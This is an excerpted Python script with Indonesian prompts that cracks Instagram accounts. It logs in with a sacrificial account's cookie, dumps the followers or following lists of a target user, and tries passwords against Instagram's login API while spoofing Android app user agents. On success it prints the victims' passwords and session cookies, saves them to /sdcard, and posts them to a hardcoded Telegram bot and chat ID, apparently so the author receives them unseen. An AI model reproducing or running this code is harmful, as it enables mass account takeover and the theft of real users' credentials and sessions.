try:
    ...
    try:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/639487180204?text=INSTAGRAM%20ERROR%20%3A%20{quote(str(e))}')
        exit()
...
HEADERS = {
    ...
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    'accept': '*/*',
...
def Aset_Ig():
    ...
    if os.path.isfile('Data/IG-login.txt'):
        coki = {'cookie': open('Data/IG-login.txt', 'r').read().strip()}
    else:
      #  print("Silahkan Masukan Cookies Akun Instagram Pastikan Menggunakan Akun Tumbal!")
        cookie_input = input("\nCookie: ")
        if cookie_input == 'res':
            coki = {'cookie': find_res()}  
        else:
            coki = {'cookie': cookie_input.strip()}    
    try:
        uid = re.search(r'ds_user_id=(\d+)', coki['cookie'])
        if not uid:
            raise ValueError("Cookie tidak valid, ds_user_id tidak ditemukan.")        
        uid = uid.group(1)
        url = f'https://i.instagram.com/api/v1/users/{uid}/info/'
        ua = {
            "User-Agent": "Instagram 123.0.0.0 Android"
        }
        response = requests.get(url, headers=ua, cookies=coki).json()        
        if 'user' not in response:
            raise KeyError("'user' tidak ditemukan di response. Periksa kembali cookie.")        
        req = response['user']        
        ...
        if os.path.isfile('Data/IG-login.txt'):
            os.remove('Data/IG-login.txt')
        print(f"Error: {e}\nCookies Invalid, gunakan cookies yang lain!")
        time.sleep(3)
        return Aset_Ig()
...
def Menu():
	...
	banner()
	print(f"{biru}╰─{b}➤ {puti}01. Dump Dari {h}Pengikut\n{biru}╰─{b}➤{puti} 02. Dump Dari {h}Mengikuti\n{biru}╰─{b}➤ {puti}03. {k}Hapus Tumbal")
	x = input(f'{biru}╰─{b}➤ {P}PILIH : ')
	if x in ['01','1']:dumps(aset, True)
	elif x in ['02','2']:dumps(aset, False)
	elif x in ['03','3']:os.system("rm Data/IG-login.txt");print("berhasil menghapus cookies");exit()
...
def dumps(cintil, typess, xyz = []):
	...
	print(f"{biru}╰─{b}➤ {h}MASUKAN TARGET")
	users = input(f"{biru}╰─{b}➤{k} Username : ").split(',')
	print(f"")
	try:
		for y in users:
	...
	try:
		...
		for xyz in req['data']['user'][khm]['edges']:
			...
			if xy not in Uuid:
				xx += 1
				Uuid.append(xy)
				print('\rDump {}{}{}                            '.format(b, len(Uuid), P), end='')
				time.sleep(0.0009)
...
def UserAgentBarcelona():
	...
	uas = f"Instagram {versi} Android ({android_version}; {dpis}; {pxl}; m-net; Power1; m-net; mt6580; pt_PT; {kode})"
	...
	for password in memek:
		try:
			...
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				...
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				tree = Tree("");success_tree = tree.add(f"Success{P}");success_tree.add(f"{P}Loop: {k}{Loop}{P}");success_tree.add(f"{P}Username: {H}{username}{P}");success_tree.add(f"{P}FullName: {H}{fullname[:10]}{P}");success_tree.add(f"{P}Password: {H}{password}{P}");info_tree = success_tree.add(f"{P}INFO");info_tree.add(f"{P}Pengikut: {H}{peng}{P}");info_tree.add(f"{P}Mengikuti: {H}{meng}{P}");info_tree.add(f"{P}Postingan: {H}{post}{P}");info_tree.add(f"{P}fb_id: {H}{fbid}{P}");cookie_tree = success_tree.add(f"{P}Data login");cookie_tree.add(f"{P}Cookie: {A}{ig_set_authorization};{cookies}{P}");console.print(tree)
				requests.post(f'''https://api.telegram.org/bot7564098137:AAHgv1RGIv84Xcaeif0GSe1uLJNJomEzkg0/sendMessage?chat_id=7101936982&text=•𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄  : {username}\n•𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃  : {password}\n•FOLOWER   :\n{peng}'\n•FOLOWING   :\n{meng}'\n•POSTINGAN   :\n{post}'\n•𝐂𝐎𝐎𝐊𝐈𝐄𝐒   :\n{cookies}''')
				...
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				tree = Tree("");success_tree = tree.add(f"Success{P}");success_tree.add(f"{P}Username: {k}{username}{P}");success_tree.add(f"{P}FullName: {k}{fullname[:10]}{P}");success_tree.add(f"{P}Password: {k}{password}{P}");info_tree = success_tree.add(f"{P}INFO");info_tree.add(f"{P}Pengikut: {k}{peng}{P}");info_tree.add(f"{P}Mengikuti: {k}{meng}{P}");info_tree.add(f"{P}Postingan: {k}{post}{P}");info_tree.add(f"{P}fb_id: {k}{fbid}{P}");cookie_tree = success_tree.add(f"{P}Data login");cookie_tree.add(f"{P}usertagent: {A}{ua}{P}");console.print(tree)
				open('/sdcard/Ress/cp-Instagram.json','a').write(f"{username}|{password}\n{peng}|{meng}\n")
				break
